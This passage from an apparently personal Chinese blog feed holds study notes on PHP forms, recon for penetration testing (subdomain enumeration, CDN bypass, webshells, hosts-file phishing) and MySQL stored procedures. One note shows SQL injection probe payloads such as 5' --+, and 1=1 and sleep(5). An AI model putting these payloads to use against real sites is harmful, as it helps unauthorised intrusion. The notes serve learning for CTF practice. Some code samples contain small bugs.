title="php错误处理"></a>php错误处理</h2><ol><li>在创建脚本和web应用程序时，错误处理是一个重要的部分。</li></ol><h2 id="基本的错误处理：使用die-函数"><a href="#基本的错误处理：使用die-函数" class="headerlink" title="基本的错误处理：使用die()函数"></a>基本的错误处理：使用die()函数</h2><ol><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220802155519.png"></li><li>die()函数的错误处理机制，在错误之后终止了脚本</li></ol><h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li>PHP过滤器用于验证和过滤来自非安全来源的数据</li><li>验证和过滤用户输入或自定义是任何web应用程序的重要组成部分</li></ol><h2 id="为什么使用过滤器"><a href="#为什么使用过滤器" class="headerlink" title="为什么使用过滤器"></a>为什么使用过滤器</h2><ol><li>几乎所有的web应用程序都依赖外部的输入，这些数据通常都来自用户或其它应用程序</li><li>使用过滤器，能确保所有应用程序都获得正确的输入类型</li></ol><h2 id="什么是外部数据？"><a href="#什么是外部数据？" class="headerlink" title="什么是外部数据？"></a>什么是外部数据？</h2><pre class="line-numbers language-none"><code class="language-none">来自表单的输入数据Cookies服务器变量数据库查询结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数和过滤器"><a href="#函数和过滤器" class="headerlink" title="函数和过滤器"></a>函数和过滤器</h2><ol><li>如果需要过滤变量，使用以下的过滤器函数之一<pre class="line-numbers language-none"><code class="language-none">filter_var() 通过一个指定的过滤器来过滤单一的变量filter_var_array() 通过相同的或不同的过滤器来过滤多个变量filter_input() 获取一个输入变量，并对它进行过滤filter_input_array() 获取多个输入变量，并通过相同的或不同的过滤器对他们进行过滤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><a href="https://www.w3school.com.cn/php/php_ref_filter.asp">https://www.w3school.com.cn/php/php_ref_filter.asp</a>  php-filter函数</li></ol><h1 id="PHP表单"><a href="#PHP表单" class="headerlink" title="PHP表单"></a>PHP表单</h1><h2 id="PHP表单处理"><a href="#PHP表单处理" class="headerlink" title="PHP表单处理"></a>PHP表单处理</h2><pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;&lt;form action&#x3D;&#39;welcome.php&#39; method&#x3D;&#39;post&#39;&gt;Name: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;name&#39;&gt;&lt;br&gt;E-mail: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;email&#39;&gt;&lt;br&gt;&lt;input type&#x3D;&#39;submit&#39;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>用户填写此表单并点击提交按钮后，表单数据会发送到名为welcome.php的文件供处理，表单数据是通过HTTP POST的方式发送的</li><li>如需显示出被提交的数据，您可以简单地输出（echo）所有变量。”welcome.php” 文件是这样的：<pre class="line-numbers language-none"><code class="language-none">&lt;html&gt;&lt;body&gt;welcome &lt;?php echo $_POST[&quot;name&quot;];?&gt;&lt;br&gt;your email address is: &lt;?php echo $_POST[&quot;email&quot;]?&gt;&lt;br&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="文本字段"><a href="#文本字段" class="headerlink" title="文本字段"></a>文本字段</h3><pre class="line-numbers language-none"><code class="language-none">Name: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;name&#39;&gt;E-mail: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&#39;email&#39;&gt;website: &lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;website&#39;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h3><ol><li>gender字段是单选按钮,其中，radio的type类型是单选框<pre class="line-numbers language-none"><code class="language-none">gender:&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;female&#39;&gt; female&lt;input type&#x3D;&#39;radio&#39; name&#x3D;&#39;gender&#39; value&#x3D;&#39;male&#39;&gt; male<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="表单元素"><a href="#表单元素" class="headerlink" title="表单元素"></a>表单元素</h3><pre class="line-numbers language-none"><code class="language-none">&lt;form method&#x3D;&#39;post&#39; action&#x3D;&quot;&lt;?php echo htmlspecialchars($_SERVER[&quot;PHP_SELF&quot;]);?&gt;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>当提交此表单时，通过method=’post’发送表单数据</li></ol><h3 id="SERVER-“PHP-SELF”"><a href="#SERVER-“PHP-SELF”" class="headerlink" title="$_SERVER[“PHP_SELF”]"></a>$_SERVER[“PHP_SELF”]</h3><ol><li>$_SERVER[“PHP_SELF”]是一种超全局变量，它返回当前执行脚本的文件名</li><li>因此，$_SERVER[“PHP_SELF”]将表单数据发送到页面本身，而不是跳转到另一张页面，这样用户就能在表单页面获得错误提示信息</li></ol><h2 id="表单验证-1"><a href="#表单验证-1" class="headerlink" title="表单验证"></a>表单验证</h2><h3 id="验证名字"><a href="#验证名字" class="headerlink" title="验证名字"></a>验证名字</h3><ol><li>检查name字段是否包含字母和空格，如果name字段无效，则存储一条错误信息<pre class="line-numbers language-none"><code class="language-none">$name&#x3D;test_input($_POST[&quot;name&quot;]);if(!preg_match(&quot;&#x2F;^[a-zA-Z]*$&#x2F;&quot;,name))&#123;    $emailErr&#x3D;&#39;无效的email格式&#39;;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>preg_match()函数检索字符串的模式，如果模式存在则返回true,否则返回false</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪老师信息收集</title>
      <link href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/"/>
      <url>/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<h1 id="概念名词"><a href="#概念名词" class="headerlink" title="概念名词"></a>概念名词</h1><h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><ol><li>网站地址的名称</li><li>注册：在第三方平台注册，万网（被阿里云收购）<h3 id="二级域名，多级域名"><a href="#二级域名，多级域名" class="headerlink" title="二级域名，多级域名"></a>二级域名，多级域名</h3></li><li>www是顶级域名，域名有几个点就算几个域名，一级域名只有一个点，往往由与品牌高度相关的主域名和后缀组成</li><li>二级域名，是一级域名的子域名，是企业根据不同的业务场景进行的拓展</li><li>一级域名和二级域名区别：二级域名依附于一级域名而存在吗，没有一级域名，就不存在二级域名，如果不作二级域名，一级域名则不会受到影响。</li><li>处罚连带不同，一级域名被处罚，二级域名也会被处罚；二级域名被处罚时，一级域名则不会受到影响。</li><li>以example.cn这个一级域名为例，我们在设置解析记录时，将主机记录值设置为“www”，然后指向IP为192.168.1.1，那么我们访问<a href="http://www.example.cn,就会跳转到192.168.1.1这个站点;如果我们将主机值设置为“mail”,然后将ip指向192.168.2.2,那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点./">www.example.cn，就会跳转到192.168.1.1这个站点；如果我们将主机值设置为“mail”，然后将IP指向192.168.2.2，那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点。</a><h4 id="域名分类"><a href="#域名分类" class="headerlink" title="域名分类"></a>域名分类</h4></li><li>国家级和地区级顶级域名</li><li>一级域名</li><li>二级域名</li></ol><h2 id="域名发现对渗透测试的意义"><a href="#域名发现对渗透测试的意义" class="headerlink" title="域名发现对渗透测试的意义"></a>域名发现对渗透测试的意义</h2><ol><li>不同的多级域名包含的信息不同，例如<a href="http://www.xxx.com/">www.xxx.com</a> 和jw.xxx.com的网页信息可能不同，可以多个尝试</li><li>多级域名是给与了多个可能性</li></ol><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><ol><li>域名系统服务协议</li><li>用于域名和IP地址的相互转换</li><li>网页搭建的时候是将IP解析到指定域名下</li></ol><h3 id="本地hosts和dns的关系"><a href="#本地hosts和dns的关系" class="headerlink" title="本地hosts和dns的关系"></a>本地hosts和dns的关系</h3><ol><li>ping的时候，先从本地hosts文件下找对应的域名对应的IP，并ping这个IP</li><li>如果没有，则到互联网的DNS服务器中找</li><li>目的：如果当绑定IP地址绑定到指定域名下时</li><li>在对方访问的时候，令对方访问到你指定的IP地址中去</li><li>如果能修改对方的hosts文件，修改一个对方需要访问的域名对应的IP，对方仍使用这个域名的时候就可以访问到自己写的网站，从而构成钓鱼链接</li></ol><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><ol><li>网络协议</li><li>内容分布网络，节点技术</li><li>在访问的时候，会自动匹配到速度较好的服务器，而这个服务器被叫做节点</li><li>在访问网站的真实数据的时候，访问的节点上的缓存，而不是网站的真实数据</li><li>扫描网站的时候，访问的是缓存，而不是真正的网站数据，是没有任何意义的</li></ol><h3 id="刷新dns缓存命令-windows"><a href="#刷新dns缓存命令-windows" class="headerlink" title="刷新dns缓存命令(windows)"></a>刷新dns缓存命令(windows)</h3><ol><li>ipconfig /flushdns</li></ol><h3 id="DNS攻击"><a href="#DNS攻击" class="headerlink" title="DNS攻击"></a>DNS攻击</h3><ol><li>dns劫持等</li><li>导致大量用户访问网站的时候被<strong>恶意解析</strong>，<strong>访问到其它的IP</strong></li><li>每个地区解析的地址不一样，对应的DNS服务器地址不一样，被黑对应的一部分服务器，对应的就是一部分地区的用户，所以LINUX老师在上课的时候说现在网络安全性很好，没有<strong>大范围的网络瘫痪</strong></li></ol><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2><ol><li>网站源码有多种脚本语言编写，常见<strong>php</strong> <strong>javaweb</strong>,asp aspx jsp pi <strong>py</strong> cgi<h3 id="不同脚本类型和安全漏洞的关系"><a href="#不同脚本类型和安全漏洞的关系" class="headerlink" title="不同脚本类型和安全漏洞的关系"></a>不同脚本类型和安全漏洞的关系</h3></li><li>如果语言严谨，注重发展比较多，发展时间长，安全性漏洞性高</li><li>所以开发用安全语言</li><li>php用于小众网站，java用于大众网站</li></ol><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><ol><li>攻击者通常会留一个后门文件，便于下一次获得权限，webshell</li><li>远控木马等的通称，是一个泛称</li></ol><h3 id="后门在安全测试中的意义"><a href="#后门在安全测试中的意义" class="headerlink" title="后门在安全测试中的意义"></a>后门在安全测试中的意义</h3><ol><li>便于下一次方便地获取权限进系统</li><li>获取到相关权限，类似一个管道，操作这台服务区需要一个东西链接上去，这个东西就叫做后门</li></ol><h3 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h3><ol><li>核心</li><li>网站大多数集合了一些防护杀毒，免杀就是隐藏，不被杀毒检测到，隐藏起来</li></ol><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="组成架构模型"><a href="#组成架构模型" class="headerlink" title="组成架构模型"></a>组成架构模型</h3><ol><li>网站源码：脚本类型(java反序列化，php上传漏洞)、分应用方向（方向不同，函数不同，漏洞也就不同）</li><li>服务器操作系统：windows,linux（系统不同，命令不同，登录服务器的方式不同）</li><li>中间件（搭建平台）:apache lis tomcat nginx （提供服务的，网站除了网站源码，还需要运行网站源码）</li><li>数据库:access mysql oracle db2 postsql（储存数据）</li></ol><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><h3 id="web源码对应漏洞"><a href="#web源码对应漏洞" class="headerlink" title="web源码对应漏洞"></a>web源码对应漏洞</h3><ol><li>sql注入</li><li>文件上传</li><li>xss</li><li>代码执行</li><li>变量覆盖</li><li>逻辑漏洞</li><li>反序列化</li></ol><h3 id="web中间件漏洞"><a href="#web中间件漏洞" class="headerlink" title="web中间件漏洞"></a>web中间件漏洞</h3><h3 id="web数据库对应漏洞"><a href="#web数据库对应漏洞" class="headerlink" title="web数据库对应漏洞"></a>web数据库对应漏洞</h3><h3 id="web系统层漏洞"><a href="#web系统层漏洞" class="headerlink" title="web系统层漏洞"></a>web系统层漏洞</h3><h3 id="第三方对应漏洞"><a href="#第三方对应漏洞" class="headerlink" title="第三方对应漏洞"></a>第三方对应漏洞</h3><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="多级域名枚举查找"><a href="#多级域名枚举查找" class="headerlink" title="多级域名枚举查找"></a>多级域名枚举查找</h3><ol><li>使用浏览器查找（爬）：输入一级域名，自动查找匹配二级域名，例如：搜索baidu.com,会自动匹配<a href="http://www.baidu.com和vip.baidu.com等/">www.baidu.com和vip.baidu.com等</a></li><li>子域名爆破（<strong>layer子域名挖掘机</strong>）的字典是前缀，所以爆破的时候需要删除二级域名，只保留已经确定的一级域名</li><li>注意：御剑跑的是后缀，而不是前缀</li></ol><h1 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h1><h2 id="主要用于信息搜集"><a href="#主要用于信息搜集" class="headerlink" title="主要用于信息搜集"></a>主要用于信息搜集</h2><h2 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h2><ol><li>提升网络速度</li><li>cdn服务</li><li>但是cdn需要花钱，所以按需来，不是每一个网站都有cdn服务，开得越多，成本越大</li></ol><h2 id="cdn原理"><a href="#cdn原理" class="headerlink" title="cdn原理"></a>cdn原理</h2><ol><li>从网上下载东文件，为了下一个访问者下载更快，上一个访问者下载之后，会在本地运营商的服务器中留缓存，下一个访问者下载时，会优先在这个服务器中的缓存中下载</li><li>分配缓存实际是分配节点，会就近分配一个节点给用户</li><li>和互联网的缓存原理相同，访问时会优先本地请求</li><li><strong>但是缓存不是实时更新的</strong></li><li>渗透测试时可能操作的是cdn缓存，而不是真正的目标</li></ol><h2 id="如何判定目标存在CDN服务"><a href="#如何判定目标存在CDN服务" class="headerlink" title="如何判定目标存在CDN服务"></a>如何判定目标存在CDN服务</h2><ol><li>利用网站超级ping（<strong>多个地点ping服务</strong>）（利用<strong>海外和国内多个服务器</strong>对目标网站进行<strong>ping</strong>的操作，根据IP地址的<strong>回显</strong>来判断是否有cdn）</li><li><strong><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></strong></li><li>如果一个网站出现两个IP，就开启了ｃｄｎ服务</li></ol><h2 id="常见CDN绕过技术"><a href="#常见CDN绕过技术" class="headerlink" title="常见CDN绕过技术"></a>常见CDN绕过技术</h2><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><ol><li>有可能子域名和主域名不在一个服务器上</li><li>一种可能是和主站放在一起（同一个IP地址）</li><li>还有一个可能是放在同一网段下，不同主机下（网络号相同，但是主机号不同）</li><li>或在不同网段<h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3></li><li>为了节约成本，站长可能会对访问量较大的网站做cdn服务</li><li>对那些小的子网站不做cdn服务</li></ol><h3 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h3><ol><li>邮件服务器</li><li>对方把邮件发给你，如果有cdn服务时，自己访问邮箱地址的时候是就近安排节点</li><li>但是对方给你发邮件的时候，不会走cdn，随便找个cdn服务器发送</li></ol><h3 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h3><h3 id="遗留文件，扫描全网"><a href="#遗留文件，扫描全网" class="headerlink" title="遗留文件，扫描全网"></a>遗留文件，扫描全网</h3><ol><li>遗留文件就是phpinfo</li></ol><h3 id="黑暗引擎搜索特定文件"><a href="#黑暗引擎搜索特定文件" class="headerlink" title="黑暗引擎搜索特定文件"></a>黑暗引擎搜索特定文件</h3><ol><li>shodan   撒旦</li><li>fofa   </li><li>zoomeye   钟馗之眼<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4></li><li>另类的搜索引擎，利用这个黑暗引擎可以搜索到不常见的东西</li><li>这些搜索引擎会定期把网上一些深层次的东西爬到数据库中</li><li>这些数据库中的东西就是实时的（延时低）</li></ol><h3 id="dns历史记录，以量打量"><a href="#dns历史记录，以量打量" class="headerlink" title="dns历史记录，以量打量"></a>dns历史记录，以量打量</h3>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断注入类型</title>
      <link href="/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/"/>
      <url>/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="区分是字符型注入还是数字型注入"><a href="#区分是字符型注入还是数字型注入" class="headerlink" title="区分是字符型注入还是数字型注入"></a>区分是字符型注入还是数字型注入</h2><h3 id="数字型注入："><a href="#数字型注入：" class="headerlink" title="数字型注入："></a>数字型注入：</h3><ol><li>假设后台语句构造为select * from table where id=$id</li><li>传入5’ –+</li><li>select * from table where id=5’ –+ 未产生单引号闭合，所以报错</li></ol><h3 id="字符型注入："><a href="#字符型注入：" class="headerlink" title="字符型注入："></a>字符型注入：</h3><ol><li>假设后台语句构造为select * from table where id=$’id’</li><li>传入5’ –+</li><li>select * from table where id=’5’ –+ ‘</li><li>最后的一个单引号被注释掉，单引号可以闭合，此时查询正确</li></ol><h3 id="所以加单引号去判断是数字型注入还是字符型注入"><a href="#所以加单引号去判断是数字型注入还是字符型注入" class="headerlink" title="所以加单引号去判断是数字型注入还是字符型注入"></a>所以加单引号去判断是数字型注入还是字符型注入</h3><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;5 and 1&#x3D;1 如果返回页面与原页面一致（回显正确） 则为数值型注入原因：    1. 猜测为数值型，后台语句为select * from table where id&#x3D;5 and 1&#x3D;1；where语句判断条件为真并且id参数值为5，正常执行    2. 猜测为字符型，后台语句为select * from table where id&#x3D;&#39;5 and 1&#x3D;1&#39;;where 语句将找不到id为&#39;5 and 1&#x3D;1&#39; 的参数，语句执行失败如果是字符型：传入 5&#39; and 1&#x3D;1 --+字符型后台语句为：    select * from table where id&#x3D;&#39;5&#39; and 1&#x3D;1 --+ &#39;;后面的单引号被注释，不需要担心单引号闭合问题，id&#x3D;&#39;5&#39;才是真正的id查询语句，id参数的值应该是一个值，而不是带上and 1&#x3D;1,因为数据库中没有带着and 1&#x3D;1的名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="判断页面是否有布尔类型的状态"><a href="#判断页面是否有布尔类型的状态" class="headerlink" title="判断页面是否有布尔类型的状态"></a>判断页面是否有布尔类型的状态</h2><ol><li>判断数据类型是字符型还是数值型（<strong>这个地方的数据类型和注入类型不是一个概念</strong>，<strong>数据类型是只有字符型和数值型，而注入类型是指字符型，数值型，布尔盲注，时间盲注等类型</strong>）</li><li>假设?id=5 and 1=1;返回页面与源页面一致，通过该参数我们可以确定该注入的<strong>数据类型</strong>为数字注入</li><li>当参数为?id=5 and 1=2由于and 1=2 为假，也就是查询条件where id=5 and 1=2恒假，这样的sql语句在数据库中执行后，没有返回结果，也就是说能正常回显内容与语句的真假性有关（<strong>是否出现回显内容与语句的真假性有关</strong>，<strong>而不是回显内容与语句的真假性有关</strong>，语句的真假性若和会先内容有关而不是是否出现回显和语句的真假性有关的话，则不为盲注）<h3 id="判断参数是否存在延迟注入"><a href="#判断参数是否存在延迟注入" class="headerlink" title="判断参数是否存在延迟注入"></a>判断参数是否存在延迟注入</h3></li><li>按f12打开调试面板，修改参数为?id=5 and sleep(5),并刷新，如果sleep语句对网页的响应起到作用，就意味着存在延迟注入的可能</li></ol><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><pre class="line-numbers language-none"><code class="language-none">（1）因为id参数是用户可控的，会随请求带入到数据库中执行并回显相应内容，可能是一个注入点。（2）第一步当id变化时，页面回显响应变化，首先考虑联合注入（3）第二步，加单引号或双引号，当有报错时，可考虑报错注入；（4）当第二步没变化，进行第三步，当页面有布尔类型的状态，可考虑布尔盲注；（5）若都不行，进行第四步，考虑延时注入。（6）从联合注入到盲注以及延迟注入，其时间人力成本逐步增大，尽可能选择低成本方式进行注入。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql存储过程和函数</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%92%8C%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="存储过程和数据库"><a href="#存储过程和数据库" class="headerlink" title="存储过程和数据库"></a>存储过程和数据库</h1><pre class="line-numbers language-none"><code class="language-none">show global variables like &#39;_O%&#39;;show session variables;set @username &#x3D; &#39;刘禅&#39;;-- set可以定义全局变量和用户变量，也可以给全局变量，用户变量和局部变量赋值-- declare定义局部变量-- declare 变量名列表 类型 default值-- if条件表达式&#x2F;* if(条件) then 语句序列1;elseif(条件) then 语句序列2;else 语句序列;end if;每个语句序列后面都要加分号;if elseif else endifendif 后面也要加分号*&#x2F;delimiter $$begindeclare v_avgscore float;    select round(avg(score),2) into v_avgscore from sc where sno &#x3D; &#39;s3&#39;;    if(v_avgscore &gt;&#x3D; 80.0) then select &#39;该生成绩好&#39;;elseif(v_avgscore &lt; 80 and v_avgscore &gt;&#x3D; 60) thenselect &#39;一般&#39;;elseselect &#39;abab&#39;;end if;end $$begindeclare v_avgscore float;    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s3&#39;;    if() then 语句1;    elseif() then 语句2;    elseif() then 语句3;    else 语句4;    end if;end $$ &#x2F;*case 选择变量名    when 表达式1 then 语句序列1;    when 表达式2 then 语句序列2;    else 语句序列n+1;end case;*&#x2F;begindeclare v_avgscore float;    declare v_grade int;    select round(avg(score),2) into v_avgscore from sc where sno&#x3D;&#39;s1&#39;;    set v_grade &#x3D; truncate(v_avgscore&#x2F;10.0);    case v_gradewhen 10 then 语句序列1;        when 9 then 语句序列2;        when 8 then 语句序列3;        else 语句序列最后一个;        end case;end;-- case和if判断都有else和end case或者end ifbegindeclare v_count,v_sum int default 0;while v_count &lt; 100 doset v_count &#x3D; v_count + 1;        set v_sum &#x3D; v_sum + v_count;end while;    select v_sum as 1~100的和end $$&#x2F;*while 条件表达式 do循环体语句end while;*&#x2F;&#x2F;*repeat循环体语句;until 条件表达式 until后面没有分号结尾end repeat;*&#x2F;begindeclare v_count,v_sum int default 0;    repeatset v_count &#x3D; v_count + 1;        set v_sum &#x3D; v_sum + v_count;        until v_count &gt;&#x3D; 100 -- until后面没有分号end repeat;    select v_sum,v_count;end $$-- while do end while; repeat until end repeat;-- mysql中使用declare handler语句处理异常-- declare handle_action handler for condition_value statementdeclare continue handler for 1062 set info&#x3D;&#39;插入失败，不能插入重复的数据&#39;;declare exit handler for not found set info&#x3D;&#39;查找失败&#39;;declare continue handler for 1064 set info &#x3D; &#39;语法错误&#39;;-- 存储过程，函数，游标，触发器-- 存储过程&#x2F;*create procedure 存储过程名(in&#x2F;out&#x2F;inout 参数名 参数类型    in&#x2F;out&#x2F;inout 参数名2 参数类型2    in&#x2F;out&#x2F;inout 参数名3 参数类型3)begin声明部分;    执行部分;end;*&#x2F;delimiter $$create procedure user_time()beginselect current_user as 当前用户 ,current_date as 当前日期;end $$delimiter ;use school;create procedure p_sum()begindeclare v_count int default 1;    declare v_sum int default 0;while v_count &lt; 100 doset v_sum &#x3D; v_sum + v_count;        set v_count &#x3D; v_count + 2;end while;    select v_sum as &#39;1~100的和&#39;;end $$delimiter ;call p_sum();delimiter $$create procedure p_sum();begindeclare real_sum int default 0;    declare real_count int default 1;    while real_count &lt;&#x3D; 100 doreal_sum &#x3D; real_sum + real_count;        real_count &#x3D; real_count + 1;end while;    select real_sum,real_count;end $$delimiter $$delimiter $$create procedure p_summ()begindeclare real_sum int default 0;    declare real_count int default 1;    repeatreal_sum &#x3D; real_sum + real_count;        real_count &#x3D; real_count + 1;until real_count &gt; 100    end repeat;end $$delimiter ;call user_time();-- 调用存储过程 call 存储过程名([实参1,实参2,实参3,。。。])-- 如果存储过程有参数，可以将参数放在小括号里，如果没有参数，后面的小括号也不能省略。-- 参数：参数名 类型-- 带参数的存储过程delimiter $$create procedure insert_department(p_dno char(2),    p_dname varchar(30);    p_office varchar(4)    )begindeclare info varchar(20) default &#39;插入成功&#39;;    declare continue handler for 1062 set info &#x3D; &#39;插入失败，不能插入重复的数据&#39;;    insert into department values(p_dno,p_dname,p_office);    select info;end $$delimiter ;call insert_department(&#39;D5&#39;,&#39;美术&#39;,&#39;&#39;,&#39;&#39;);-- 带输入参数的存储过程delimiter $$create procedure delete_department(p_dno char(2))begindelete from department where dno&#x3D;p_dno;    select * from department;end $$delimiter ;call delete_department(&#39;D5&#39;);-- 带输出参数的存储过程-- mysql存储过程参数如果不指定in,out,inout,则默认为indelimiter $$create procedure search_department(p_dno char(2),    out p_dname varchar(30) -- 最后一个参数后面不加逗号，类似于select最后一个参数后面不加逗号)begindeclare info varchar(30) default &#39;查找成功&#39;;    declare continue handler for not found set info &#x3D; &#39;查找失败&#39;;    select dname into p_dname from department where dno &#x3D; p_dno;    select info;end $$delimiter ;-- 带输入输出参数的存储过程delimiter $$create procedure swap(inout p_num1 int,    inout p_num2 int -- p_num1和p_num2既作为输入也作为输出，所以是inout)begindeclare v_temp int;    set v_temp &#x3D; p_num1;    set p_num1 &#x3D; p_num2;    set p_num2 &#x3D; v_temp;end $$delimiter ;set @n1&#x3D;12;set @n2&#x3D;56;call swap(@n1,@n2);select @n1,@n2;-- 删除存储过程drop procedure if exists swap;drop procedure if exists swap;drop procedure if exists p_name;-- 函数只可以使用输入类型的数据，但参数前不可以指定IN;-- 参数必须通过return语句来返回一个值，但参数方程没有返回值-- 函数通常作为表达式的一部分杯调用，而存储过程的调用使用的是call-- 创建函数的语法&#x2F;*create function 函数名（参数名1 参数类型1.        参数名2 参数类型2，        参数名n 参数类型n    ）    returns 数据类型    begin声明部分        return 表达式end $$*&#x2F;delimiter $$create function get_avgscore(f_sno char(2))returns floatbeginreturn(select round(avg(score),2))    from sc where sno&#x3D;f_sno;end $$delimiter ;delimiter $$create function get_avgscore(f_sno char(2))returns floatbeginreturn(select round(avg(score),2) from sc where sno &#x3D; f_sno);end $$delimiter ;drop function if exists get_avgscore;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></s